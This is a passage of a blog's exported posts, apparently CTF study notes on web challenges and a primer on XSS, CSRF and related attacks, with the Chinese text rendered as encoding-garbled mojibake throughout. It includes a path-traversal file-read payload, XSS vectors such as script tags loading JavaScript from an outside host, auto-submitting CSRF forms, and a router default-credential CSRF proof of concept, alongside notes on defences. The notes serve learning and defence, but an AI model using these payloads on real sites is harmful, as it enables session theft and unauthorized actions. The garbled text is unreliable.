ä¸€ä¸ªfileï¼Œfileå¿…é¡»æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶æ‰èƒ½ç»§ç»­æ‰§è¡Œä¸‹å»ï¼š</h4><p>1.fileå¿…é¡»ä¸ä¸ºç©º<br>2.fileå¿…é¡»æ˜¯å­—ç¬¦ä¸²<br>3.fileåœ¨æ‰§è¡Œemmm::checkFileå‡½æ•°åè¿”å›å€¼å¿…é¡»ä¸ºTrueã€‚</p><p>æ¥ä¸‹æ¥åˆ©ç”¨/ä½¿source.php?æˆä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•ï¼Œæœ€åincludeåˆ©ç”¨â€¦/è·³è½¬ç›®å½•è¯»å–flagå³å¯<br>?file=source.php?/â€¦/â€¦/â€¦/â€¦/â€¦/ffffllllaaaagggg</p><h4 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h4><h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><h4 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h4><h4 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h4><h4 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h4><p>ä¸æ˜¯ç”¨å›¾ç‰‡é©¬ç»•è¿‡ï¼Œè€Œæ˜¯åˆ é™¤é™åˆ¶ä»£ç </p><h4 id="nizhuansiwei"><a href="#nizhuansiwei" class="headerlink" title="nizhuansiwei"></a>nizhuansiwei</h4><p><a href="https://blog.csdn.net/RABCDXB/article/details/113733607">https://blog.csdn.net/RABCDXB/article/details/113733607</a> è§£é¢˜</p><p><a href="https://blog.csdn.net/nzjdsds/article/details/82461043">https://blog.csdn.net/nzjdsds/article/details/82461043</a>  phpä¼ªåè®®</p><p>æ­£åˆ™ï¼špreg_match  åºåˆ—åŒ–æ“ä½œ</p><h4 id="Web-python-template"><a href="#Web-python-template" class="headerlink" title="Web python template"></a>Web python template</h4><p><a href="https://www.cnblogs.com/darklee/p/12625742.html%E8%A7%A3%E9%A2%98">https://www.cnblogs.com/darklee/p/12625742.htmlè§£é¢˜</a></p><p>ç›¸å…³ç½‘å€<a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a></p><h4 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web php unserialize"></a>Web php unserialize</h4><h4 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h4><h4 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h4>]]></content>
      
      
      
        <tags>
            
            <tag> æ”»é˜²ä¸–ç•Œ_web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çŸ¥è¯†ç‚¹</title>
      <link href="/2021/02/01/web/mixed/"/>
      <url>/2021/02/01/web/mixed/</url>
      
        <content type="html"><![CDATA[<h5 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h5><p><a href="https://www.cnblogs.com/bonelee/p/7875163.html">https://www.cnblogs.com/bonelee/p/7875163.html</a></p><h4 id="xssï¼š"><a href="#xssï¼š" class="headerlink" title="xssï¼š"></a>xssï¼š</h4><p>è½¬è½½è‡ª<a href="https://blog.csdn.net/qq_33929420/article/details/112003122">https://blog.csdn.net/qq_33929420/article/details/112003122</a></p><p>ä»¥ä¸‹å†…å®¹ç®€åŒ–ï¼Œè¯¦æƒ…è§é“¾æ¥æ–‡ç« </p><h5 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h5><p>è·¨ç«™è„šæœ¬Cross-site-scripting,ç®€ç§°ï¼šcss</p><p>ä½†ä¸ºäº†é¿å…ä¸å±‚å æ ·å¼è¡¨ï¼ˆCascading Style Sheetsï¼ŒCSSï¼‰çš„ç¼©å†™æ··æ·†</p><p>å› æ­¤ï¼Œå°†è·¨ç«™è„šæœ¬æ”»å‡»ç¼©å†™ä¸ºXSSã€‚</p><p>XSSæ”»å‡»é€šå¸¸æŒ‡çš„æ˜¯é€šè¿‡åˆ©ç”¨ç½‘é¡µå¼€å‘æ—¶ç•™ä¸‹çš„æ¼æ´ï¼Œï¼Œç”¨å·§å¦™çš„æ³¨å…¥æ–¹æ³•æ³¨å…¥æ¶æ„æŒ‡ä»¤ä»£ç åˆ°ç½‘é¡µ</p><p>ä½¿ç”¨æˆ·åŠ è½½å¹¶æ‰§è¡Œæ”»å‡»è€…æ¶æ„åˆ¶é€ çš„ç½‘é¡µç¨‹åº</p><p>è¿™äº›æ¶æ„ç½‘é¡µç¨‹åºé€šå¸¸æ˜¯JavaScriptï¼Œä½†å®é™…ä¸Šä¹Ÿå¯ä»¥åŒ…æ‹¬Javaã€ VBScriptã€ LiveScriptã€ActiveXã€ Flash æˆ–è€…ç”šè‡³æ˜¯æ™®é€šçš„HTMLã€‚æ”»å‡»æˆåŠŸåï¼Œæ”»å‡»è€…å¯èƒ½å¾—åˆ°åŒ…æ‹¬ä½†ä¸é™äºæ›´é«˜çš„æƒé™ï¼ˆå¦‚æ‰§è¡Œä¸€äº›æ“ä½œï¼‰ã€ç§å¯†ç½‘é¡µå†…å®¹ã€ä¼šè¯å’Œcookieç­‰å„ç§å†…å®¹</p><h5 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h5><p>åå°„å‹ï¼ˆéæŒä¹…å‹ï¼‰XSS</p><p>å­˜å‚¨å‹ï¼ˆæŒä¹…å‹ï¼‰XSS</p><p>DOMå‹XSS</p><p>é€šç”¨å‹XSS</p><p>çªå˜å‹XSS</p><p><img src="/2021/02/01/web/mixed/5f02cc1ca48e6f86487e0072ea8e1456.png" alt="img"></p><p><img src="/2021/02/01/web/mixed/17ec53688c413d46def4f1ebf979a819.png" alt="img"></p><h5 id="XSSæ”»å‡»ä»£ç å‡ºç°çš„åœºæ™¯"><a href="#XSSæ”»å‡»ä»£ç å‡ºç°çš„åœºæ™¯" class="headerlink" title="XSSæ”»å‡»ä»£ç å‡ºç°çš„åœºæ™¯"></a>XSSæ”»å‡»ä»£ç å‡ºç°çš„åœºæ™¯</h5><p>æ™®é€šçš„XSS JavaScriptæ³¨å…¥ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><SCRIPT src="http://3w.org/XSS/xss.js"></SCRIPT><p>IMGæ ‡ç­¾XSSä½¿ç”¨JavaScriptå‘½ä»¤ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><SCRIPT src="http://3w.org/XSS/xss.js"></SCRIPT><p>IMGæ ‡ç­¾æ— åˆ†å·æ— å¼•å·ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><IMG src="javascript:alert(â€˜XSSâ€™)"><p>IMGæ ‡ç­¾å¤§å°å†™ä¸æ•æ„Ÿï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><IMG src="JaVaScRiPt:alert(â€˜XSSâ€™)"><p>HTMLç¼–ç (å¿…é¡»æœ‰åˆ†å·)ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><IMG src="javascript:alert(â€œXSSâ€)">.........<h5 id="XSS-æ”»å‡»çš„é¢„é˜²"><a href="#XSS-æ”»å‡»çš„é¢„é˜²" class="headerlink" title="XSS æ”»å‡»çš„é¢„é˜²"></a>XSS æ”»å‡»çš„é¢„é˜²</h5><h6 id="1-è¾“å…¥è¿‡æ»¤"><a href="#1-è¾“å…¥è¿‡æ»¤" class="headerlink" title="1.è¾“å…¥è¿‡æ»¤"></a>1.è¾“å…¥è¿‡æ»¤</h6><h6 id="2-å‰ç«¯æ¸²æŸ“æŠŠä»£ç å’Œæ•°æ®åˆ†éš”å¼€"><a href="#2-å‰ç«¯æ¸²æŸ“æŠŠä»£ç å’Œæ•°æ®åˆ†éš”å¼€" class="headerlink" title="2.å‰ç«¯æ¸²æŸ“æŠŠä»£ç å’Œæ•°æ®åˆ†éš”å¼€"></a>2.å‰ç«¯æ¸²æŸ“æŠŠä»£ç å’Œæ•°æ®åˆ†éš”å¼€</h6><h6 id="3-æ‹¼æ¥HTMLæ—¶å¯¹å…¶è¿›è¡Œè½¬ä¹‰"><a href="#3-æ‹¼æ¥HTMLæ—¶å¯¹å…¶è¿›è¡Œè½¬ä¹‰" class="headerlink" title="3.æ‹¼æ¥HTMLæ—¶å¯¹å…¶è¿›è¡Œè½¬ä¹‰"></a>3.æ‹¼æ¥HTMLæ—¶å¯¹å…¶è¿›è¡Œè½¬ä¹‰</h6><h4 id="ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ï¼Œä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–"><a href="#ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ï¼Œä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–" class="headerlink" title="ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ï¼Œä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–"></a>ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ï¼Œä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–</h4><p><a href="https://blog.csdn.net/u011215133/article/details/51177843?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">https://blog.csdn.net/u011215133/article/details/51177843?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control</a></p><h4 id="å¼±å£ä»¤"><a href="#å¼±å£ä»¤" class="headerlink" title="å¼±å£ä»¤"></a>å¼±å£ä»¤</h4><p>ä¸€äº›ç®€å•çš„ç»„åˆå¯†ç </p><p><a href="https://blog.csdn.net/qq_37931597/article/details/87267829?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161700465316780255266108%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161700465316780255266108&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-87267829.first_rank_v2_pc_rank_v29&amp;utm_term=%E5%BC%B1%E5%8F%A3%E4%BB%A4&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/qq_37931597/article/details/87267829?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161700465316780255266108%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161700465316780255266108&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-87267829.first_rank_v2_pc_rank_v29&amp;utm_term=%E5%BC%B1%E5%8F%A3%E4%BB%A4&amp;spm=1018.2226.3001.4187</a></p><h4 id="IPæ¬ºéª—ï¼ˆXFFå¤´ç­‰ï¼‰"><a href="#IPæ¬ºéª—ï¼ˆXFFå¤´ç­‰ï¼‰" class="headerlink" title="IPæ¬ºéª—ï¼ˆXFFå¤´ç­‰ï¼‰"></a>IPæ¬ºéª—ï¼ˆXFFå¤´ç­‰ï¼‰</h4><p><a href="https://blog.csdn.net/zz_Caleb/article/details/84147066">https://blog.csdn.net/zz_Caleb/article/details/84147066</a></p><p>X-Forwarded-For:</p><h4 id="æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´"></a>æ–‡ä»¶åŒ…å«æ¼æ´</h4><h4 id="TCP-IP"><a href="#TCP-IP" class="headerlink" title="TCP/IP"></a>TCP/IP</h4><p><img src="/2021/02/01/web/mixed/1.jpg"></p><p><img src="/2021/02/01/web/mixed/2.jpg"></p><h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><p>è½¬è½½é“¾æ¥ï¼š<a href="https://www.jianshu.com/p/7f33f9c7997b">https://www.jianshu.com/p/7f33f9c7997b</a>    ä½œè€…ï¼šå¤©é’è‰²ç­‰çƒŸé›¨</p><p>ä¸ªäººè¿›è¡Œäº†ä¸€äº›ä¿®æ”¹ã€‚</p><h5 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h5><p>å…¨åä¸ºCross Site Request Forgeryâ€”-è·¨ç«™è¯·æ±‚ä¼ªé€ </p><p>ä¸€ç§ç½‘ç»œæ”»å‡»æ–¹å¼</p><p>é€šå¸¸è¿˜å¯ç¼©å†™ä¸ºCSRFæˆ–è€…XSRF</p><p>é€šè¿‡<strong>ä¼ªè£…æ¥è‡ªå—ä¿¡ä»»çš„ç”¨æˆ·</strong>çš„è¯·æ±‚æ¥åˆ©ç”¨å—ä¿¡ä»»çš„ç½‘ç«™ã€‚</p><p>ç®€å•ç†è§£å®ƒå¯ä»¥åšçš„äº‹ï¼š</p><p>åœ¨ç›—ç”¨ä½ çš„èº«ä»½åï¼Œä»¥ä½ çš„åä¹‰å‘é€æ¶æ„è¯·æ±‚</p><p>1.å‘é€é‚®ä»¶</p><p>2.å‘æ¶ˆæ¯</p><p>3.ç›—å–è´¦å·</p><p>4.è´­ä¹°å•†å“</p><p>â€¦â€¦â€¦</p><h5 id="åŸç†ï¼š"><a href="#åŸç†ï¼š" class="headerlink" title="åŸç†ï¼š"></a>åŸç†ï¼š</h5><p><img src="/2021/02/01/web/mixed/webp" alt="img"></p><p>â€‹        ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œè¦å®Œæˆä¸€æ¬¡CSRFæ”»å‡»ï¼Œå—å®³è€…å¿…é¡»ä¾æ¬¡å®Œæˆä¸¤ä¸ªæ­¥éª¤ï¼š</p><ul><li><p>ç™»å½•å—ä¿¡ä»»ç½‘ç«™Aï¼Œå¹¶åœ¨æœ¬åœ°ç”ŸæˆCookieã€‚</p></li><li><p>åœ¨ä¸ç™»å‡ºAçš„æƒ…å†µä¸‹ï¼Œè®¿é—®å±é™©ç½‘ç«™Bã€‚</p><p>â€‹        çœ‹åˆ°è¿™é‡Œï¼Œä½ ä¹Ÿè®¸ä¼šè¯´ï¼šâ€œå¦‚æœæˆ‘ä¸æ»¡è¶³ä»¥ä¸Šä¸¤ä¸ªæ¡ä»¶ä¸­çš„ä¸€ä¸ªï¼Œæˆ‘å°±ä¸ä¼šå—åˆ°CSRFçš„æ”»å‡»â€ã€‚</p><p>â€‹        æ˜¯çš„ï¼Œç¡®å®å¦‚æ­¤ï¼Œä½†ä½ ä¸èƒ½ä¿è¯ä»¥ä¸‹æƒ…å†µä¸ä¼šå‘ç”Ÿï¼š</p><p>1.ä½ ä¸èƒ½ä¿è¯ä½ ç™»å½•äº†ä¸€ä¸ªç½‘ç«™åï¼Œä¸å†æ‰“å¼€ä¸€ä¸ªtabé¡µé¢å¹¶è®¿é—®å¦å¤–çš„ç½‘ç«™ã€‚</p><p>2.ä½ ä¸èƒ½ä¿è¯ä½ å…³é—­æµè§ˆå™¨äº†åï¼Œä½ æœ¬åœ°çš„Cookieç«‹åˆ»è¿‡æœŸï¼Œä½ ä¸Šæ¬¡çš„ä¼šè¯å·²ç»ç»“æŸã€‚</p><p>(äº‹å®ä¸Šï¼Œå…³é—­æµè§ˆå™¨ä¸èƒ½ç»“æŸä¸€ä¸ªä¼šè¯ï¼Œä½†å¤§å¤šæ•°äººéƒ½ä¼šé”™è¯¯çš„è®¤ä¸ºå…³é—­æµè§ˆå™¨å°±ç­‰äºé€€å‡ºç™»å½•/ç»“æŸä¼šè¯äº†â€¦â€¦)</p><p>3.ä¸Šå›¾ä¸­æ‰€è°“çš„æ”»å‡»ç½‘ç«™ï¼Œå¯èƒ½æ˜¯ä¸€ä¸ªå­˜åœ¨å…¶ä»–æ¼æ´çš„å¯ä¿¡ä»»çš„ç»å¸¸è¢«äººè®¿é—®çš„ç½‘ç«™.</p><p><a href="https://link.jianshu.com/?t=http://www.80sec.com/csrf-securit.html(%E8%AF%A6%E7%BB%86%E7%9A%84%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D)">https://link.jianshu.com/?t=http://www.80sec.com/csrf-securit.html(è¯¦ç»†çš„åŸç†ä»‹ç»)</a></p><h5 id="å‡ ç§å¸¸è§çš„æ”»å‡»ç±»å‹"><a href="#å‡ ç§å¸¸è§çš„æ”»å‡»ç±»å‹" class="headerlink" title="å‡ ç§å¸¸è§çš„æ”»å‡»ç±»å‹"></a><strong>å‡ ç§å¸¸è§çš„æ”»å‡»ç±»å‹</strong></h5><h6 id="GETç±»å‹çš„CSRF"><a href="#GETç±»å‹çš„CSRF" class="headerlink" title="GETç±»å‹çš„CSRF"></a>GETç±»å‹çš„CSRF</h6><p>è¿™ç§ç±»å‹çš„CSRFä¸€èˆ¬æ˜¯ç”±äºç¨‹åºå‘˜å®‰å…¨æ„è¯†ä¸å¼ºé€ æˆçš„ã€‚</p><p>GETç±»å‹çš„CSRFåˆ©ç”¨éå¸¸ç®€å•ï¼Œåªéœ€è¦ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œæ‰€ä»¥ï¼Œä¸€èˆ¬ä¼šè¿™æ ·åˆ©ç”¨ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://wooyun.org/csrf?xx</span>=<span class="string">11</span> /&gt;</span> </span><br></pre></td></tr></table></figure><p>åœ¨è®¿é—®å«æœ‰è¿™ä¸ªimgçš„é¡µé¢åï¼ŒæˆåŠŸå‘<code>http://wooyun.org/csrf?xx=11</code> å‘å‡ºäº†ä¸€æ¬¡HTTPè¯·æ±‚ã€‚æ‰€ä»¥ï¼Œå¦‚æœå°†è¯¥ç½‘å€æ›¿æ¢ä¸ºå­˜åœ¨GETå‹CSRFçš„åœ°å€ï¼Œå°±èƒ½å®Œæˆæ”»å‡»äº†ã€‚</p><p><a href="https://link.jianshu.com/?t=http://wooyun.org/bugs/wooyun-2010-023783">ä¹Œäº‘æ¡ˆä¾‹</a></p><h6 id="POSTç±»å‹çš„CSRF"><a href="#POSTç±»å‹çš„CSRF" class="headerlink" title="POSTç±»å‹çš„CSRF"></a>POSTç±»å‹çš„CSRF</h6><p>è¿™ç§ç±»å‹çš„CSRFå±å®³æ²¡æœ‰GETå‹çš„å¤§ï¼Œåˆ©ç”¨èµ·æ¥é€šå¸¸ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªè‡ªåŠ¨æäº¤çš„è¡¨å•ï¼Œå¦‚ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">http://wooyun.org/csrf.php</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;xx&quot;</span> <span class="attr">value</span>=<span class="string">&quot;11&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="built_in">document</span>.forms[<span class="number">0</span>].submit(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>è®¿é—®è¯¥é¡µé¢åï¼Œè¡¨å•ä¼šè‡ªåŠ¨æäº¤ï¼Œç›¸å½“äºæ¨¡æ‹Ÿç”¨æˆ·å®Œæˆäº†ä¸€æ¬¡POSTæ“ä½œã€‚</p><p><a href="https://link.jianshu.com/?t=http://wooyun.org/bugs/wooyun-2010-026622">ä¹Œäº‘æ¡ˆä¾‹</a></p><h6 id="å…¶ä»–çŒ¥çæµCSRF"><a href="#å…¶ä»–çŒ¥çæµCSRF" class="headerlink" title="å…¶ä»–çŒ¥çæµCSRF"></a>å…¶ä»–çŒ¥çæµCSRF</h6><p>è¿‡åŸºç¡€è®¤è¯çš„CSRF(å¸¸ç”¨äºè·¯ç”±å™¨):</p><p>POC:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://admin:admin@192.168.1.1</span> /&gt;</span> </span><br></pre></td></tr></table></figure><p>åŠ è½½è¯¥å›¾ç‰‡åï¼Œè·¯ç”±å™¨ä¼šç»™ç”¨æˆ·ä¸€ä¸ªåˆæ³•çš„SESSIONï¼Œå°±å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œäº†ã€‚<br> <a href="https://link.jianshu.com/?t=http://www.wooyun.org/bugs/wooyun-2013-026825">ä¹Œäº‘æ¡ˆä¾‹</a></p><h5 id="é˜²å¾¡CSRFçš„ç­–ç•¥"><a href="#é˜²å¾¡CSRFçš„ç­–ç•¥" class="headerlink" title="é˜²å¾¡CSRFçš„ç­–ç•¥"></a>é˜²å¾¡CSRFçš„ç­–ç•¥</h5><p>åœ¨ä¸šç•Œç›®å‰é˜²å¾¡ CSRF æ”»å‡»ä¸»è¦æœ‰ä¸‰ç§ç­–ç•¥ï¼š</p><p>éªŒè¯ HTTP Referer å­—æ®µï¼›</p><p>åœ¨è¯·æ±‚åœ°å€ä¸­æ·»åŠ  token å¹¶éªŒè¯ï¼›</p><p>åœ¨ HTTP å¤´ä¸­è‡ªå®šä¹‰å±æ€§å¹¶éªŒè¯</p><p>ä»¥ä¸‹ç›´æ¥æ‘˜æŠ„ï¼š</p><h6 id="éªŒè¯-HTTP-Referer-å­—æ®µ"><a href="#éªŒè¯-HTTP-Referer-å­—æ®µ" class="headerlink" title="éªŒè¯ HTTP Referer å­—æ®µ"></a>éªŒè¯ HTTP Referer å­—æ®µ</h6><p>æ ¹æ® HTTP åè®®ï¼Œåœ¨ HTTP å¤´ä¸­æœ‰ä¸€ä¸ªå­—æ®µå« Refererï¼Œå®ƒè®°å½•äº†è¯¥ HTTP è¯·æ±‚çš„æ¥æºåœ°å€ã€‚åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼Œè®¿é—®ä¸€ä¸ªå®‰å…¨å—é™é¡µé¢çš„è¯·æ±‚æ¥è‡ªäºåŒä¸€ä¸ªç½‘ç«™ï¼Œæ¯”å¦‚éœ€è¦è®¿é—® <code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>ï¼Œç”¨æˆ·å¿…é¡»å…ˆç™»é™† bank.exampleï¼Œç„¶åé€šè¿‡ç‚¹å‡»é¡µé¢ä¸Šçš„æŒ‰é’®æ¥è§¦å‘è½¬è´¦äº‹ä»¶ã€‚å› æ­¤ï¼Œè¦é˜²å¾¡ CSRF æ”»å‡»ï¼Œç½‘ç«™åªéœ€è¦å¯¹äºæ¯ä¸€ä¸ªè½¬è´¦è¯·æ±‚éªŒè¯å…¶ Referer å€¼ï¼Œå¦‚æœæ˜¯ä»¥ bank.example å¼€å¤´çš„åŸŸåï¼Œåˆ™è¯´æ˜è¯¥è¯·æ±‚æ˜¯æ¥è‡ªé“¶è¡Œç½‘ç«™è‡ªå·±çš„è¯·æ±‚ï¼Œæ˜¯åˆæ³•çš„ã€‚å¦‚æœ Referer æ˜¯å…¶ä»–ç½‘ç«™çš„è¯ï¼Œåˆ™æœ‰å¯èƒ½æ˜¯é»‘å®¢çš„ CSRF æ”»å‡»ï¼Œæ‹’ç»è¯¥è¯·æ±‚ã€‚<br> è¿™ç§æ–¹æ³•çš„æ˜¾è€Œæ˜“è§çš„å¥½å¤„å°±æ˜¯ç®€å•æ˜“è¡Œï¼Œç½‘ç«™çš„æ™®é€šå¼€å‘äººå‘˜ä¸éœ€è¦æ“å¿ƒ CSRF çš„æ¼æ´ï¼Œåªéœ€è¦åœ¨æœ€åç»™æ‰€æœ‰å®‰å…¨æ•æ„Ÿçš„è¯·æ±‚ç»Ÿä¸€å¢åŠ ä¸€ä¸ªæ‹¦æˆªå™¨æ¥æ£€æŸ¥ Referer çš„å€¼å°±å¯ä»¥ã€‚<br> ç„¶è€Œï¼Œè¿™ç§æ–¹æ³•å¹¶éä¸‡æ— ä¸€å¤±ã€‚Referer çš„å€¼æ˜¯ç”±æµè§ˆå™¨æä¾›çš„ï¼Œè™½ç„¶ HTTP åè®®ä¸Šæœ‰æ˜ç¡®çš„è¦æ±‚ï¼Œä½†æ˜¯æ¯ä¸ªæµè§ˆå™¨å¯¹äº Referer çš„å…·ä½“å®ç°å¯èƒ½æœ‰å·®åˆ«ï¼Œå¹¶ä¸èƒ½ä¿è¯æµè§ˆå™¨è‡ªèº«æ²¡æœ‰å®‰å…¨æ¼æ´ã€‚ä½¿ç”¨éªŒè¯ Referer å€¼çš„æ–¹æ³•ï¼Œå°±æ˜¯æŠŠå®‰å…¨æ€§éƒ½ä¾èµ–äºç¬¬ä¸‰æ–¹ï¼ˆå³æµè§ˆå™¨ï¼‰æ¥ä¿éšœï¼Œä»ç†è®ºä¸Šæ¥è®²ï¼Œè¿™æ ·å¹¶ä¸å®‰å…¨ã€‚äº‹å®ä¸Šï¼Œå¯¹äºæŸäº›æµè§ˆå™¨ï¼Œæ¯”å¦‚<code>IE6 æˆ– FF2</code>ï¼Œç›®å‰å·²ç»æœ‰ä¸€äº›æ–¹æ³•å¯ä»¥ç¯¡æ”¹ Referer å€¼ã€‚å¦‚æœ ç½‘ç«™æ”¯æŒ<code>IE6 æµè§ˆå™¨</code>ï¼Œé»‘å®¢å®Œå…¨å¯ä»¥æŠŠç”¨æˆ·æµè§ˆå™¨çš„ Referer å€¼è®¾ä¸ºä»¥ bank.example åŸŸåå¼€å¤´çš„åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡éªŒè¯ï¼Œä»è€Œè¿›è¡Œ CSRF æ”»å‡»ã€‚<br> å³ä¾¿æ˜¯ä½¿ç”¨æœ€æ–°çš„æµè§ˆå™¨ï¼Œé»‘å®¢æ— æ³•ç¯¡æ”¹ Referer å€¼ï¼Œè¿™ç§æ–¹æ³•ä»ç„¶æœ‰é—®é¢˜ã€‚å› ä¸º Referer å€¼ä¼šè®°å½•ä¸‹ç”¨æˆ·çš„è®¿é—®æ¥æºï¼Œæœ‰äº›ç”¨æˆ·è®¤ä¸ºè¿™æ ·ä¼šä¾µçŠ¯åˆ°ä»–ä»¬è‡ªå·±çš„éšç§æƒï¼Œç‰¹åˆ«æ˜¯æœ‰äº›ç»„ç»‡æ‹…å¿ƒ Referer å€¼ä¼šæŠŠç»„ç»‡å†…ç½‘ä¸­çš„æŸäº›ä¿¡æ¯æ³„éœ²åˆ°å¤–ç½‘ä¸­ã€‚å› æ­¤ï¼Œç”¨æˆ·è‡ªå·±å¯ä»¥è®¾ç½®æµè§ˆå™¨ä½¿å…¶åœ¨å‘é€è¯·æ±‚æ—¶ä¸å†æä¾› Refererã€‚å½“ä»–ä»¬æ­£å¸¸è®¿é—®é“¶è¡Œç½‘ç«™æ—¶ï¼Œç½‘ç«™ä¼šå› ä¸ºè¯·æ±‚æ²¡æœ‰ Referer å€¼è€Œè®¤ä¸ºæ˜¯ CSRF æ”»å‡»ï¼Œæ‹’ç»åˆæ³•ç”¨æˆ·çš„è®¿é—®ã€‚</p><h6 id="åœ¨è¯·æ±‚åœ°å€ä¸­æ·»åŠ -token-å¹¶éªŒè¯"><a href="#åœ¨è¯·æ±‚åœ°å€ä¸­æ·»åŠ -token-å¹¶éªŒè¯" class="headerlink" title="åœ¨è¯·æ±‚åœ°å€ä¸­æ·»åŠ  token å¹¶éªŒè¯"></a>åœ¨è¯·æ±‚åœ°å€ä¸­æ·»åŠ  token å¹¶éªŒè¯</h6><p>CSRF æ”»å‡»ä¹‹æ‰€ä»¥èƒ½å¤ŸæˆåŠŸï¼Œæ˜¯å› ä¸ºé»‘å®¢å¯ä»¥å®Œå…¨ä¼ªé€ ç”¨æˆ·çš„è¯·æ±‚ï¼Œè¯¥è¯·æ±‚ä¸­æ‰€æœ‰çš„ç”¨æˆ·éªŒè¯ä¿¡æ¯éƒ½æ˜¯å­˜åœ¨äº cookie ä¸­ï¼Œå› æ­¤é»‘å®¢å¯ä»¥åœ¨ä¸çŸ¥é“è¿™äº›éªŒè¯ä¿¡æ¯çš„æƒ…å†µä¸‹ç›´æ¥åˆ©ç”¨ç”¨æˆ·è‡ªå·±çš„ cookie æ¥é€šè¿‡å®‰å…¨éªŒè¯ã€‚è¦æŠµå¾¡ CSRFï¼Œå…³é”®åœ¨äºåœ¨è¯·æ±‚ä¸­æ”¾å…¥é»‘å®¢æ‰€ä¸èƒ½ä¼ªé€ çš„ä¿¡æ¯ï¼Œå¹¶ä¸”è¯¥ä¿¡æ¯ä¸å­˜åœ¨äº cookie ä¹‹ä¸­ã€‚å¯ä»¥åœ¨ HTTP è¯·æ±‚ä¸­ä»¥å‚æ•°çš„å½¢å¼åŠ å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„ tokenï¼Œå¹¶åœ¨æœåŠ¡å™¨ç«¯å»ºç«‹ä¸€ä¸ªæ‹¦æˆªå™¨æ¥éªŒè¯è¿™ä¸ª tokenï¼Œå¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰ token æˆ–è€… token 